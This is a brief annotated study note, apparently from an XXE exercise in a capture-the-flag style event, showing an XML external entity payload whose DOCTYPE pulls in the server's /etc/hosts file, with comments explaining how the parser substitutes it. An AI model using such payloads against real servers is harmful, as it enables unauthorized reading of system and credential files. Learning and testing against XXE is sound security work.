# XML file (from XXE in AoC24) that includes references for external entities

# First two lines introduce an external entity called 'payload'
<!--?xml version="1.0" ?-->
# '<!ENTITY...>' tells the XML parser to replace the '&payload;' reference
# with the contents of the '/etc/hosts/' file on the server (i.e. SYSTEM)
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
# The lines above are what was added to the original XML file below
